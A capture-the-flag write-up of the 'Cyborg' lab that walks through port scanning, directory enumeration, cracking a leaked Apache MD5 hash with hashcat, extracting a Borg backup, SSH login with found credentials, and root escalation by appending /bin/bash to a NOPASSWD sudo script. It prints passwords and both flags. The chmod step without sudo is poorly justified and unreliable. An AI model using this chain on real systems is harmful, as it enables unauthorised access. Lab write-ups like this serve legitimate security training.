
# CTF Writeup: Cyborg

---
## Reconaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sS -p- 10.112.166.132      
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-05 04:43 CDT
Nmap scan report for 10.112.166.132
Host is up (0.011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.62 seconds
```

An more detailled scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p 22,80 10.112.166.132
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-05 04:43 CDT
Nmap scan report for 10.112.166.132
Host is up (0.012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds
```

Since the webpage itself seemed to be an default apache webpage. I started off with enumerating endpoints.

```
gobuster dir -u http://10.112.166.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.166.132
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 316] [--> http://10.112.166.132/admin/]
/etc                  (Status: 301) [Size: 314] [--> http://10.112.166.132/etc/]
/server-status        (Status: 403) [Size: 279]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

Identified several endpoints including an exposed admin panel and an /etc systemlevel path in the webroot.

I started of with inspecting the /etc endpoint and it seemed to be an simple share. In which there is an passwd file & also an "squid.conf" file with the following payload.

```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users

```
Received the following credentials.

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

From the authentication it hints that we'll need to utilize "squid" proxy.

The "Admins" tab on the /admin endpoint reveals the following information.

```
[Today at 5.45am from Alex]
                Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
                I decided to give up like i always do ahahaha sorry about that.
                I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
                Might pass it over to the IT guys but in the meantime all the config files are laying about.
                And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
                other than that im pretty sure my backup "music_archive" is safe just to confirm.
```

Cracked the encoded hash of user "music_archive. using hashcat.

```
hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 5003/10007 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (7555 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward           
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
Time.Started.....: Tue May  5 05:01:39 2026 (2 secs)
Time.Estimated...: Tue May  5 05:01:41 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:    22103 H/s (13.08ms) @ Accel:80 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 39040/14344385 (0.27%)
Rejected.........: 0/39040 (0.00%)
Restore.Point....: 38720/14344385 (0.27%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidate.Engine.: Device Generator
Candidates.#01...: 290586 -> pinche
Hardware.Mon.#01.: Util: 89%

Started: Tue May  5 05:01:36 2026
Stopped: Tue May  5 05:01:43 2026
```

On the website there was an possibility to download an archive.tar file!

Decompressed it.

```
tar -xvf archive.tar
```

Received many information including an README file which told us that the archive is an "Borg Backup", after some research of borg backup I realised it's an linux integrated tool. I installed it

```
apt install borgbackup
```

Extracted the archive with the credentials of user "music_archive".

```
borg extract ./home/field/dev/final_archive::music_archive
```

Received home directory of user "alex"

Discovered credentials in /home/alex/Documents/note.txt

```
alex:S3cretP@s3
```

Logged into user "alex".

```
ssh alex@10.112.166.132         
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
alex@10.112.166.132's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$
```

Retrieved user.txt in /home/alex directory.

```
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

When the current user is in (sudo) group.

```
alex@ubuntu:~$ id
uid=1000(alex) gid=1000(alex) groups=1000(alex),4(adm),24(cdrom),27(sudo)
```

The user is able to run the following script without authentication with root permissions, but has no write access.

```
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

Since we are part of the sudo group we can use chmod to give write permissions.

```
chmod 777 /etc/mp3backups/backup.sh
```

Add bash shell command to script.

```
echo "/bin/bash" >> /etc/mp3backups/backup.sh
```

Run script and get root shell

```
sudo /etc/mp3backups/backup.sh
root@ubuntu:~#
```

Retrieved root.txt in /root directory.

```
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```